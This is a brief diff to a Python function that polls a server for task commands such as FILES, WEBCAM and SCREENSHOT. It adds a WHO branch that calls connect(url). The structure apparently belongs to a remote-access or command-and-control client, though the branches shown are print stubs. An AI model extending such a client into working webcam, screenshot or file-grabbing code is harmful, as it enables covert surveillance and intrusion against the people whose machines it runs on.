@@ -77,6 +77,7 @@ def task_check(url):
         elif task == "FILES": print("FILES")
         elif task == "WEBCAM": print("WEBCAM")
         elif task == "SCREENSHOT": print("SCREENSHOT")
+        elif task == "WHO": connect(url)
         
     except requests.exceptions.ConnectionError:
         print("[-] Cannot connect to server")
